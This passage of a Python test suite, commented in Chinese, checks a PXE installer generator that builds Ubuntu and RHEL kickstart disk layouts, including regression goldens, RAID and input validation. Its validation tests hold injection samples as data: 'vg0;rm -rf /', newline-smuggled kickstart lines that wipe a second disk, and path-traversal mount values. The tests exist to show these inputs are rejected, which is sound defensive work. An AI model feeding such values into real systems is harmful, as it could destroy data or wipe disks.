        self.assertNotIn(" ", url, "URL 里不能出现裸空格")
        # 反解回来必须是真实文件名 —— _iso_size_mb 就是靠它去 stat 的
        from urllib.parse import unquote
        self.assertEqual(unquote(url.rsplit("/", 1)[-1]), "ubuntu 22.04 live.iso")

    def test_iso_size_mb_rejects_bad_names(self):
        """空串与路径穿越必须返回 0，不能拿去 stat 任意路径。"""
        from app.api import pxe as api_pxe
        self.assertEqual(api_pxe._iso_size_mb(""), 0)
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/.."), 0)
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/."), 0)
        # 不存在的文件也必须是 0（不能抛）
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/nope-xyz.iso"), 0)


# ==================== 磁盘与分区（方案 C / docs/PARTITION.md） ====================
#
# 这一组测试对应规格 §2/§3/§4/§5/§6。最要紧的两条：
#   · 回归红线 §5.1：disk_config 缺省/空/只有历史键 "disk" 时**逐字不变**（真机验证过的 4 套）；
#   · 反向断言：disk_config={"target":{"mode":"auto"}} 的产物里不许出现字面量 sda。

# 改造前（HEAD）的磁盘行，逐字抄在这里当红线基准。任何"顺手重排注释/空格"都会被它抓住。
LEGACY_KS_LVM = [
    "clearpart --drives=sda --all --initlabel",
    "part /boot/efi --fstype=efi --size=512",
    "part /boot --fstype=ext4 --size=1024",
    "part pv.01 --size=1 --grow",
    "volgroup vg0 pv.01",
    "logvol / --vgname=vg0 --name=root --size=20480 --fstype=ext4",
    "logvol swap --vgname=vg0 --name=swap --size=8192",
    "logvol /home --vgname=vg0 --name=home --size=10240 --fstype=ext4",
    "bootloader --location=mbr --boot-drive=sda",
]
LEGACY_KS_DIRECT = [
    "clearpart --drives=sda --all --initlabel",
    "part /boot/efi --fstype=efi --size=512",
    "part / --fstype=ext4 --ondisk=sda --grow",
    "part swap --size=8192",
    "bootloader --location=mbr --boot-drive=sda",
]

# 规格 §2 的示例分区表（LVM 那条按澄清补上 mount）
CUSTOM_PARTS = [
    {"mount": "/boot/efi", "size": "512M", "fstype": "fat32"},
    {"mount": "/boot", "size": "1G", "fstype": "ext4"},
    {"mount": "swap", "size": "8G"},
    {"vg": "vg0", "lv": "root", "mount": "/", "size": "rest", "fstype": "ext4"},
]


def _mask_pw(text):
    """sha512_crypt 每次调用盐都不同；比对"逐字不变"之前只 mask 密文本身。"""
    return re.sub(r"\$6\$[^\s'\"]+", "$6$MASK", text)


def _ks_disk_block(ks):
    """取出 ks 主体里 user 行之后、selinux 行之前的磁盘行。"""
    lines = ks.splitlines()
    start = next(i for i, l in enumerate(lines) if l.startswith("user --name=")) + 1
    end = next(i for i, l in enumerate(lines) if l.startswith("selinux "))
    return [l for l in lines[start:end] if l.strip()]


def _ks_main_body(ks):
    """%pre 块与 %include 之外的"主体"行（磁盘行必须已经从这里消失）。"""
    out, in_pre = [], False
    for line in ks.splitlines():
        if line.startswith("%pre"):
            in_pre = True
            continue
        if in_pre:
            if line == "%end":
                in_pre = False
            continue
        if line.startswith("%include"):
            continue
        out.append(line)
    return out


class PxeDiskRegressionTest(unittest.TestCase):
    """回归红线 §5.1：disk_config 缺省/空/只有历史键 "disk" 时逐字不变。"""

    def _rhel(self, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(**kw)

    def test_legacy_ubuntu_storage_line_is_unchanged(self):
        """三个 layout + 历史键 disk 的 storage 行，必须与改造前逐字一致。"""
        cases = [
            ({}, '  storage: {"layout": {"name": "lvm"}}'),
            ({"disk_scheme": "direct"}, '  storage: {"layout": {"name": "direct"}}'),
            ({"disk_scheme": "zfs"}, '  storage: {"layout": {"name": "zfs"}}'),
            # 非法 layout 回退 lvm（既有行为）
            ({"disk_scheme": "unknown-xyz"}, '  storage: {"layout": {"name": "lvm"}}'),
            # 历史键 disk → match.path，且 storage 仍是 layout 简写
            ({"disk_config": {"disk": "vda"}},
             '  storage: {"layout": {"name": "lvm", "match": {"path": "/dev/vda"}}}'),
            # 只有历史键 disk 且为空串时，仍然是 match.path=/dev/（既有行为，不"优化"）
            ({"disk_config": {"disk": ""}},
             '  storage: {"layout": {"name": "lvm", "match": {"path": "/dev/"}}}'),
        ]
        for kw, expected in cases:
            with self.subTest(kw=kw):
                ud = generate_all(_cfg(**kw))["user-data"]
                self.assertIn(expected, ud.splitlines(), ud)

    def test_legacy_rhel_disk_lines_are_unchanged(self):
        """RHEL 三个 layout（zfs 与 lvm 同构）的磁盘行 + bootloader 行逐行不变。"""
        lvm = generate_all(self._rhel(disk_scheme="lvm"))["ks.cfg"]
        self.assertEqual(_ks_disk_block(lvm), LEGACY_KS_LVM)
        zfs = generate_all(self._rhel(disk_scheme="zfs"))["ks.cfg"]
        self.assertEqual(_ks_disk_block(zfs), LEGACY_KS_LVM)
        direct = generate_all(self._rhel(disk_scheme="direct"))["ks.cfg"]
        self.assertEqual(_ks_disk_block(direct), LEGACY_KS_DIRECT)

    def test_legacy_disk_key_only_is_unchanged(self):
        """只有历史键 disk（前端 Pxe.vue 一直只发这个形状）时，除盘名外逐字不变。"""
        ks = generate_all(self._rhel(disk_config={"disk": "nvme0n1"}))["ks.cfg"]
        expect = [l.replace("sda", "nvme0n1") for l in LEGACY_KS_LVM]
        self.assertEqual(_ks_disk_block(ks), expect)
        # 空 dict / 缺省 / {"disk": ""} 的差异也只来自盘名（空串 → --drives= 的形式与旧版一致）
        for dc in (None, {}):
            with self.subTest(dc=dc):
                self.assertEqual(
                    _ks_disk_block(generate_all(self._rhel(disk_config=dc))["ks.cfg"]),
                    LEGACY_KS_LVM,
                )

    def test_legacy_full_files_byte_identical_golden(self):
        """整份 user-data / ks.cfg 的字节级冻结（sha256，取自改造前的 generator）。

        口令密文是随机盐，先 mask。四个用例覆盖 Ubuntu 的 lvm/direct 与 RHEL 的
        lvm/direct，其中两个带历史键 disk —— 只要有一个字节动了，这里就会红。
        """
        # key 用 json 文本（dict 不可哈希）
        golden = {
            '["ubuntu","lvm",null]':
                "6680721c74a9cefc63bdba945daa035dbf199ad6ca312c2c180ab86a64e8931a",
            '["ubuntu","direct",{"disk":"vda"}]':
                "f7d357d3c69052f5f4abab66dc4428b0cc368a849cafb76c8104901022223346",
            '["rhel","lvm",null]':
                "76f4c51b696456af2e365750c7b363735c1bd9398bd03cc4c83e8b4fe8a93ac3",
            '["rhel","direct",{"disk":"nvme0n1"}]':
                "5a4d0316b6f6e5f34cceeec8151be8c5edad2b4e8cb3a3c0fbf96e149dc938ce",
        }
        cases = [
            ("ubuntu", "lvm", None),
            ("ubuntu", "direct", {"disk": "vda"}),
            ("rhel", "lvm", None),
            ("rhel", "direct", {"disk": "nvme0n1"}),
        ]
        for os_type, scheme, dc in cases:
            key = json.dumps([os_type, scheme, dc], separators=(",", ":"))
            with self.subTest(case=key):
                cfg = _cfg(os_type=os_type, disk_scheme=scheme, disk_config=dc,
                           mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
                files = generate_all(cfg)
                name = "user-data" if os_type == "ubuntu" else "ks.cfg"
                got = hashlib.sha256(_mask_pw(files[name]).encode()).hexdigest()
                self.assertEqual(got, golden[key], name)


class PxeDiskSizeTest(unittest.TestCase):
    """规格 §6：尺寸单位转换（512M/20G/rest/100%FREE → bytes 或 rest）。"""

    def test_converter(self):
        from app.it.pxe.generator import _human_size_to_bytes, _size_mb
        self.assertEqual(_human_size_to_bytes("512M"), 536870912)
        self.assertEqual(_human_size_to_bytes("20G"), 21474836480)
        self.assertEqual(_human_size_to_bytes("1.5G"), 1610612736)
        self.assertEqual(_human_size_to_bytes("1T"), 1099511627776)
        # rest / 100%FREE 语义相同（都是"吃掉剩余空间"），subiquity 只认 "rest"
        self.assertEqual(_human_size_to_bytes("rest"), "rest")
        self.assertEqual(_human_size_to_bytes("100%FREE"), "rest")
        self.assertIsInstance(_human_size_to_bytes("512M"), int)
        # kickstart 侧要整数 MB
        self.assertEqual(_size_mb("512M"), 512)
        self.assertEqual(_size_mb("20G"), 20480)
        self.assertIsNone(_size_mb("rest"))

    def test_converter_rejects_junk(self):
        from app.it.pxe.generator import _human_size_to_bytes
        for bad in ("10GB", "M512", "-1G", "rest2", "512", "", "1 G", "1e3M"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    _human_size_to_bytes(bad)


class PxeCustomLayoutTest(unittest.TestCase):
    """规格 §3.4 / §6：自定义分区在两边逐行生成。"""

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_ubuntu_custom_storage_config(self):
        """EFI+boot+swap+LVM root(rest) 的 storage.config 逐条断言。"""
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": CUSTOM_PARTS}
        doc = yaml.safe_load(generate_all(_cfg(disk_config=dc))["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertEqual(storage["version"], 1)
        self.assertEqual(storage["config"], [
            {"type": "disk", "id": "disk0", "path": "/dev/sda", "wipe": True},
            {"type": "partition", "id": "part0", "device": "disk0",
             "size": 536870912, "flag": "esp"},
            {"type": "format", "id": "fmt0", "volume": "part0", "fstype": "fat32"},
            {"type": "partition", "id": "part1", "device": "disk0",
             "size": 1073741824, "flag": "boot"},
            {"type": "format", "id": "fmt1", "volume": "part1", "fstype": "ext4"},
            {"type": "partition", "id": "part2", "device": "disk0", "size": 8589934592},
            {"type": "format", "id": "fmt2", "volume": "part2", "fstype": "swap"},
            {"type": "partition", "id": "part3", "device": "disk0", "size": "rest"},
            {"type": "lvm_volgroup", "id": "vg0", "name": "vg0", "devices": ["part3"]},
            {"type": "lvm_partition", "id": "lv0", "volgroup": "vg0", "name": "root",
             "size": "rest"},
            {"type": "format", "id": "fmt3", "volume": "lv0", "fstype": "ext4"},
            {"type": "mount", "id": "mnt0", "device": "fmt0", "path": "/boot/efi"},
            {"type": "mount", "id": "mnt1", "device": "fmt1", "path": "/boot"},
            {"type": "mount", "id": "mnt2", "device": "fmt3", "path": "/"},
        ])

    def test_rhel_custom_ks_lines_name_mode(self):
        """显式盘名：Python 侧直接输出，逐行断言。"""
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": CUSTOM_PARTS}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertEqual(_ks_disk_block(ks), [
            "ignoredisk --only-use=sda",
            "clearpart --drives=sda --all --initlabel",
            "part /boot/efi --fstype=efi --ondisk=sda --size=512",
            "part /boot --fstype=ext4 --ondisk=sda --size=1024",
            "part swap --fstype=swap --ondisk=sda --size=8192",
            "part pv.01 --ondisk=sda --grow",
            "volgroup vg0 pv.01",
            "logvol / --vgname=vg0 --name=root --size=1 --grow --fstype=ext4",
            # UEFI 也是 mbr：GRUB2 不接受 --location=partition（VM141/OVMF 真机实证）
            "bootloader --location=mbr --boot-drive=sda",
        ])

    def test_rhel_custom_ks_lines_non_efi_is_mbr(self):
        """没有 ESP 的自定义分区表 ⇒ BIOS ⇒ --location=mbr。"""
        dc = {"target": {"mode": "name", "name": "vda"}, "layout": "custom",
              "partitions": [{"mount": "/", "size": "rest", "fstype": "xfs"}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertEqual(_ks_disk_block(ks), [
            "ignoredisk --only-use=vda",
            "clearpart --drives=vda --all --initlabel",
            "part / --fstype=xfs --ondisk=vda --grow",
            "bootloader --location=mbr --boot-drive=vda",
        ])

    def test_ubuntu_custom_rejects_auto_without_disk(self):
        """subiquity 的 storage.config 没有"自动挑最大盘"的写法，必须显式失败而不是写死 sda。"""
        dc = {"target": {"mode": "auto"}, "layout": "custom", "partitions": CUSTOM_PARTS}
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(disk_config=dc))
        self.assertIn("custom", str(cm.exception))

    def test_efi_and_swap_fstype_are_forced(self):
        """§2：/boot/efi 强制 fat32，swap 挂载点强制 swap（哪怕调用方写错了）。"""
        dc = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": [{"mount": "/boot/efi", "size": "512M", "fstype": "ext4"},
                             {"mount": "swap", "size": "8G", "fstype": "xfs"},
                             {"mount": "/", "size": "rest", "fstype": "ext4"}]}
        doc = yaml.safe_load(generate_all(_cfg(disk_config=dc))["user-data"])
        cfg = doc["autoinstall"]["storage"]["config"]
        fstypes = [c["fstype"] for c in cfg if c["type"] == "format"]
        self.assertIn("fat32", fstypes)
        self.assertIn("swap", fstypes)
        self.assertNotIn("ext4", [c["fstype"] for c in cfg
                                  if c["type"] == "format" and c.get("volume") == "part0"])


class PxeAutoDiskTest(unittest.TestCase):
    """规格 §3.1 + §6：自动选盘，以及"产物里不许再有 sda"的反向断言。"""

    AUTO = {"target": {"mode": "auto"}}

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_ubuntu_auto_uses_largest(self):
        doc = yaml.safe_load(generate_all(_cfg(disk_config=self.AUTO))["user-data"])
        layout = doc["autoinstall"]["storage"]["layout"]
        self.assertEqual(layout["name"], "lvm")
        self.assertEqual(layout["match"], {"size": "largest"})

    def test_ubuntu_auto_min_size_is_accepted(self):
        """min_size_gb 在 subiquity 侧表达不了下限（文档注明），但不能因此报错。"""
        doc = yaml.safe_load(
            generate_all(_cfg(disk_config={"target": {"mode": "auto", "min_size_gb": 20}}))["user-data"]
        )
        self.assertEqual(doc["autoinstall"]["storage"]["layout"]["match"], {"size": "largest"})

    def test_rhel_auto_uses_pre_and_include(self):
        """ks 没有"自动选盘"原语：必须 %pre 现场生成 /tmp/disk.ks 再 %include。"""
        ks = generate_all(self._rhel(self.AUTO))["ks.cfg"]
        self.assertIn("%pre --interpreter=/bin/bash --log=/tmp/pre-disk.log", ks)
        self.assertIn("%include /tmp/disk.ks", ks)
        self.assertIn("cat > /tmp/disk.ks <<EOF", ks)
        self.assertIn("ignoredisk --only-use=$target", ks)
        self.assertIn("clearpart --drives=$target --all --initlabel", ks)
        self.assertIn("lsblk", ks)
        # 磁盘行必须**全部**搬进片段：主体里一条都不许留（否则重复声明）
        for line in _ks_main_body(ks):
            self.assertFalse(line.startswith(("clearpart", "part ", "volgroup", "logvol",
                                              "raid ", "bootloader", "ignoredisk")), line)
        # 片段里不能残留任何写死的盘名
        self.assertNotIn("sda", ks)

    def test_rhel_auto_custom_bootloader_is_mbr_regardless_of_firmware(self):
        """bootloader 一律 mbr —— **不能**按固件分支成 partition。

        原规格 §3.2 让 UEFI 走 `--location=partition`，真机（VM141 / OVMF）实测被 anaconda 拒绝：
            GRUB2 does not support installation to a partition.
            The installer will now terminate.
        `partition` 是 syslinux 时代的写法；RHEL 8+ 的 GRUB2 不接受。UEFI 下写 mbr 时
        anaconda 会自己把 grub2-efi/shim 装进 ESP。这条测试就是钉住这个结论，
        防止有人"好心"再把固件分支加回来。
        """
        dc = dict(self.AUTO, layout="custom", partitions=CUSTOM_PARTS)
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertNotIn("/sys/firmware/efi", ks)
        self.assertNotIn("--location=partition", ks)
        self.assertNotIn("--location=$loc", ks)
        self.assertIn("bootloader --location=mbr --boot-drive=$target", ks)
        self.assertIn("cat > /tmp/disk.ks <<EOF", ks)
        self.assertIn("%include /tmp/disk.ks", ks)
        for line in _ks_main_body(ks):
            self.assertFalse(line.startswith(("clearpart", "part ", "volgroup", "logvol",
                                              "raid ", "bootloader", "ignoredisk")), line)
        # 注意：CUSTOM_PARTS 里本来就带 /boot/efi，所以上面这份 ks 正是真机挂掉的那一种配置
        # （不用再拼一个带 ESP 的变体 —— 拼了会因为"两个 /boot/efi"被校验正当拒绝）。
        # 非自定义分区路径同样是 mbr
        ks_lvm = generate_all(self._rhel(self.AUTO))["ks.cfg"]
        self.assertIn("bootloader --location=mbr --boot-drive=$target", ks_lvm)

    def test_auto_ignores_target_name(self):
        """§2：mode=auto 必须忽略 name（避免"以为自动其实写死"）。"""
        for os_type in ("ubuntu", "rhel"):
            with self.subTest(os_type=os_type):
                files = generate_all(self._rhel(
                    {"target": {"mode": "auto", "name": "sda"}}, os_type=os_type))
                blob = "\n".join(files.values())
                self.assertNotIn("sda", blob)

    def test_reverse_assertion_no_sda_literal(self):
        """§6 反向断言：disk_config={"target":{"mode":"auto"}} 的产物里 grep -c 'sda' == 0。"""
        cases = [
            _cfg(disk_config={"target": {"mode": "auto"}}),
            self._rhel({"target": {"mode": "auto"}}),
            # 自定义分区表 + 自动选盘（RHEL 走 %pre；Ubuntu 这条路径显式报错）
            self._rhel({"target": {"mode": "auto"}, "layout": "custom",
                        "partitions": CUSTOM_PARTS}),
        ]
        for cfg in cases:
            with self.subTest(os_type=cfg.os_type):
                blob = "\n".join(generate_all(cfg).values())
                self.assertEqual(blob.count("sda"), 0, blob)

    def test_rhel_match_mode_resolves_serial_in_pre(self):
        """match 模式同样由 %pre 现场解析（lsblk 按 SERIAL/MODEL 找盘）。"""
        ks = generate_all(self._rhel(
            {"target": {"mode": "match", "serial": "S3Z1NB0K123456"}}))["ks.cfg"]
        self.assertIn("awk -v s='S3Z1NB0K123456'", ks)
        self.assertIn("%include /tmp/disk.ks", ks)
        self.assertNotIn("sda", ks)

    def test_min_size_gb_is_used_in_pre(self):
        ks = generate_all(self._rhel(
            {"target": {"mode": "auto", "min_size_gb": 20}}))["ks.cfg"]
        self.assertIn("$5>=21474836480", ks)


class PxeRaidAndDataDiskTest(unittest.TestCase):
    """规格 §2/§3.3/§3.4：RAID 与"默认不碰"的数据盘。"""

    RAID_DC = {
        "target": {"mode": "match", "serial": "S3Z1NB0K123456"},
        "layout": "custom",
        "partitions": [
            {"mount": "/boot/efi", "size": "512M"},
            {"mount": "swap", "size": "4G"},
            {"size": "10G", "fstype": "xfs"},
            {"size": "10G", "fstype": "xfs"},
            {"mount": "/", "size": "rest", "fstype": "ext4"},
        ],
        "raid": [{"name": "md0", "level": 1, "devices": ["part.03", "part.04"],
                  "mount": "/data", "fstype": "xfs"}],
        "data_disks": [{"name": "sdc", "mount": "/backup", "fstype": "xfs"}],
    }

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_ubuntu_raid_and_data_disk(self):
        doc = yaml.safe_load(generate_all(_cfg(disk_config=self.RAID_DC))["user-data"])
        cfg = doc["autoinstall"]["storage"]["config"]
        raid = [c for c in cfg if c["type"] == "raid"]
        self.assertEqual(raid, [{"type": "raid", "id": "md0", "name": "md0", "raidlevel": 1,
                                 "devices": ["part2", "part3"]}])
        # RAID 成员自身不建文件系统
        self.assertEqual([c["volume"] for c in cfg if c["type"] == "format"],
                         ["part0", "part1", "part4", "md0"])
        # 目标盘走 serial（§3.1 match 模式）；数据盘 sdc 没有 wipe → 完全不碰
        disk = [c for c in cfg if c["type"] == "disk"]
        self.assertEqual(disk, [{"type": "disk", "id": "disk0",
                                 "serial": "S3Z1NB0K123456", "wipe": True}])
        self.assertNotIn("sdc", json.dumps(cfg))

    def test_rhel_raid_and_data_disk_not_touched(self):
        ks = generate_all(self._rhel(self.RAID_DC))["ks.cfg"]
        block = _ks_disk_block(ks)
        # 该盘在 %pre 片段里 —— 取片段内容做断言
        fragment = ks.split("cat > /tmp/disk.ks <<EOF\n", 1)[1].split("\nEOF", 1)[0].splitlines()
        self.assertIn("raid /data --level=1 --device=md0 --fstype=xfs raid.01 raid.02", fragment)
        self.assertIn("part raid.01 --ondisk=$target --size=10240", fragment)
        self.assertIn("part raid.02 --ondisk=$target --size=10240", fragment)
        # 数据盘默认 wipe=false ⇒ 只声明"别碰它"，绝无 clearpart/part
        self.assertIn("ignoredisk --drives=sdc", fragment)
        self.assertNotIn("clearpart --drives=$target,sdc", fragment)
        self.assertNotIn("part /backup", fragment)
        # 主体里没有磁盘行（磁盘行只在 %pre 片段里）
        for line in _ks_main_body(ks):
            self.assertFalse(line.startswith(("clearpart", "part ", "volgroup", "logvol",
                                              "raid ", "bootloader", "ignoredisk")), line)

    def test_data_disk_wipe_defaults_false(self):
        """生产红线：data_disks[].wipe 缺省必须是 false。"""
        from app.it.pxe.generator import _disk_plan
        plan = _disk_plan(_cfg(disk_config=self.RAID_DC), self.RAID_DC)
        self.assertEqual(plan["data_disks"], [
            {"name": "sdc", "mount": "/backup", "fstype": "xfs", "wipe": False}])
        # target 的 wipe 缺省是 true（装系统的盘本来就要清）
        self.assertTrue(plan["wipe"])

    def test_data_disk_wipe_true_gets_cleared_and_mounted(self):
        dc = dict(self.RAID_DC, data_disks=[{"name": "sdc", "mount": "/backup",
                                             "fstype": "xfs", "wipe": True}])
        fragment = generate_all(self._rhel(dc))["ks.cfg"].split(
            "cat > /tmp/disk.ks <<EOF\n", 1)[1].split("\nEOF", 1)[0]
        self.assertIn("clearpart --drives=$target,sdc --all --initlabel", fragment)
        self.assertIn("part /backup --fstype=xfs --size=1 --grow --ondisk=sdc", fragment)
        self.assertNotIn("ignoredisk --drives=sdc", fragment)

    def test_wipe_false_target_does_not_clearpart(self):
        dc = dict(self.RAID_DC, wipe=False)
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        # 只允许注释里出现 clearpart（说明"未执行"），不能有真的 clearpart 命令
        for line in ks.splitlines():
            self.assertFalse(line.startswith("clearpart"), line)
        self.assertIn("wipe=false", ks)

    def test_raid_devices_accept_three_id_spellings(self):
        """§3.3 的 part.01、subiquity 的 part0、§2 示例的 sda4 都折算到同一套"第 N 个分区"。"""
        from app.it.pxe.generator import _disk_plan
        for spelling in ("part.03", "part2", "sdc3"):
            with self.subTest(spelling=spelling):
                dc = dict(self.RAID_DC)
                dc["raid"] = [{"name": "md0", "level": 1, "devices": [spelling, "part.04"],
                               "mount": "/data", "fstype": "xfs"}]
                plan = _disk_plan(_cfg(disk_config=dc), dc)
                self.assertEqual(plan["raid"][0]["member_indexes"], [2, 3])


class PxeDiskValidationTest(unittest.TestCase):
    """规格 §4/§6：非法输入必须被拒，且 detail 要点明是哪个字段（含第几个分区）。"""

    BAD = [
        ("非白名单 fstype", {"layout": "custom",
                             "partitions": [{"mount": "/data", "size": "1G", "fstype": "ntfs"}]},
         "partitions[0].fstype"),
        ("rest 不在最后", {"layout": "custom",
                           "partitions": [{"mount": "/", "size": "rest"},
                                          {"mount": "/data", "size": "10G"}]},
         "partitions[0].size"),
        ("/boot/efi 重复", {"layout": "custom",
                            "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                           {"mount": "/boot/efi", "size": "512M"},
                                           {"mount": "/", "size": "rest"}]},
         "/boot/efi"),
        ("有 efi 无 /", {"layout": "custom",
                         "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                        {"mount": "/boot", "size": "1G"}]},
         "/boot/efi"),
        ("raid 引用未定义分区", {"layout": "custom",
                                 "partitions": [{"mount": "/", "size": "rest"}],
                                 "raid": [{"name": "md0", "level": 1, "devices": ["part.09"]}]},
         "raid[0].devices"),
        ("raid level 非法", {"layout": "custom",
                             "partitions": [{"mount": "/", "size": "rest"}],
                             "raid": [{"name": "md0", "level": 3, "devices": ["part.01"]}]},
         "raid[0].level"),
        ("vg 有而 lv 无", {"layout": "custom", "partitions": [{"vg": "vg0", "size": "rest"}]},
         "vg 与 lv"),
        ("lv 有而 vg 无", {"layout": "custom", "partitions": [{"lv": "root", "size": "rest"}]},
         "vg 与 lv"),
        ("data_disks 与目标盘同名", {"target": {"mode": "name", "name": "sda"},
                                     "data_disks": [{"name": "sda"}]},
         "data_disks[0].name"),
        ("mount 含 ..", {"layout": "custom",
                         "partitions": [{"mount": "/a/../etc", "size": "1G"}]},
         "partitions[0].mount"),
        ("mount 非绝对路径", {"layout": "custom",
                              "partitions": [{"mount": "data", "size": "1G"}]},
         "partitions[0].mount"),
        ("size 非法", {"layout": "custom", "partitions": [{"mount": "/", "size": "10GB"}]},
         "partitions[0].size"),
        ("layout 非法", {"layout": "raid10"}, "layout"),
        ("target.mode 非法", {"target": {"mode": "auto2"}}, "target.mode"),
        ("vg 名带注入字符", {"layout": "custom",
                             "partitions": [{"vg": "vg0;rm -rf /", "lv": "root",
                                             "mount": "/", "size": "rest"}]},
         "partitions[0].vg"),
        ("data_disks[].name 为空", {"data_disks": [{"mount": "/data"}]},
         "data_disks[0].name"),
    ]

    def test_schema_rejects_with_field_pointing_detail(self):
        """第 2 层（HTTP 入口）：422 且 detail 点明字段。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        for label, dc, needle in self.BAD:
            with self.subTest(case=label):
                with self.assertRaises(ValidationError) as cm:
                    PxeProfileIn(name="x", disk_config=dc)
                msgs = " | ".join(e["msg"] for e in cm.exception.errors())
                locs = " ".join(".".join(str(x) for x in e["loc"]) for e in cm.exception.errors())
                self.assertIn(needle, msgs + " " + locs, label)

    def test_generator_rejects_same_cases(self):
        """第 3 层：绕过 HTTP 直接调 generate_all，同样拦得住。"""
        from app.it.pxe.generator import _disk_plan
        for label, dc, _needle in self.BAD:
            with self.subTest(case=label):
                with self.assertRaises(ValueError):
                    _disk_plan(_cfg(), dc)

    def test_injection_through_new_fields_is_rejected(self):
        """新增字段不得绕过注入防护：换行/控制字符在两层都要拦。"""
        from app.it.pxe.generator import _disk_plan
        nl = chr(10)
        for dc in (
            {"layout": "custom", "partitions": [{"mount": "/data", "size": "1G",
                                                 "fstype": "ext4" + nl + "part evil"}]},
            {"layout": "custom", "partitions": [{"mount": "/data" + nl + "x", "size": "1G"}]},
            {"layout": "custom", "partitions": [{"vg": "vg0" + nl + "x", "lv": "r",
                                                 "mount": "/", "size": "rest"}]},
            {"target": {"mode": "match", "serial": "S3Z" + nl + "boom"}},
        ):
            with self.subTest(dc=str(dc)):
                with self.assertRaises(ValueError):
                    _disk_plan(_cfg(), dc)

    def test_legacy_disk_key_cannot_inject(self):
        """历史键 disk 会被拼进 ks 的 --drives=/--ondisk=：含换行时必须拦住（两层）。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        nl = chr(10)
        payload = {"disk": "sda" + nl + "clearpart --drives=sdb --all --initlabel"}
        with self.assertRaises(ValidationError):
            PxeProfileIn(name="x", disk_config=payload)
        for os_type, kw in (("ubuntu", {}), ("rhel", {"mirror": "http://m/rocky9/"})):
            with self.subTest(os_type=os_type):
                with self.assertRaises(ValueError):
                    generate_all(_cfg(os_type=os_type, disk_config=payload, **kw))
        # 合法盘名照旧（不误伤）
        ks = generate_all(_cfg(os_type="rhel", mirror="http://m/rocky9/",
                               disk_config={"disk": "vda"}))["ks.cfg"]
        self.assertIn("clearpart --drives=vda --all --initlabel", ks)

    def test_schema_and_generator_whitelists_do_not_drift(self):
        """两层的白名单必须一致（同 _OS_TYPE_ALLOWED 的做法：有测试锁住）。"""
        from app.core import schemas
        from app.it.pxe import generator
        self.assertEqual(set(schemas._DISK_FSTYPE_ALLOWED), set(generator._FSTYPE_ALLOWED))
        self.assertEqual(set(schemas._DISK_LAYOUT_ALLOWED), set(generator._DISK_LAYOUTS))
        self.assertEqual(set(schemas._DISK_MODE_ALLOWED), set(generator._DISK_MODES))
        self.assertEqual(tuple(schemas._RAID_LEVEL_ALLOWED), tuple(generator._RAID_LEVELS))
        self.assertEqual(schemas._DISK_SIZE_PATTERN, generator._SIZE_RE.pattern)
        self.assertEqual(schemas._DISK_MOUNT_RE.pattern, generator._MOUNT_RE.pattern)

    def test_schema_normalizes_but_keeps_legacy_shape(self):
        """disk_config 校验完必须还是普通 dict——它会落进 JSON 列并传给生成器。"""
        from app.core.schemas import PxeProfileIn
        self.assertEqual(PxeProfileIn(name="x").disk_config, {})
        self.assertEqual(PxeProfileIn(name="x", disk_config={}).disk_config, {})
        legacy = PxeProfileIn(name="x", disk_config={"disk": "sda"}).disk_config
        self.assertEqual(legacy, {"disk": "sda"})
        self.assertIsInstance(legacy, dict)
        # 只回填用户真正给过的键，不把默认值灌进去（否则生成器会误判成结构化配置）
        dc = PxeProfileIn(name="x", disk_config={"target": {"mode": "auto"}}).disk_config
        self.assertEqual(dc, {"target": {"mode": "auto"}})

    def test_legacy_shape_still_takes_the_old_path_after_schema(self):
        """前端只发 {disk: 盘名}：过一遍 schema 之后生成物仍与既有路径逐字一致。"""
        from app.core.schemas import PxeProfileIn
        dc = PxeProfileIn(name="x", disk_config={"disk": "sda"}).disk_config
        ks = generate_all(_cfg(os_type="rhel", os_version="9",
                               mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                               disk_config=dc))["ks.cfg"]
        self.assertEqual(_ks_disk_block(ks), LEGACY_KS_LVM)


if __name__ == "__main__":
    unittest.main()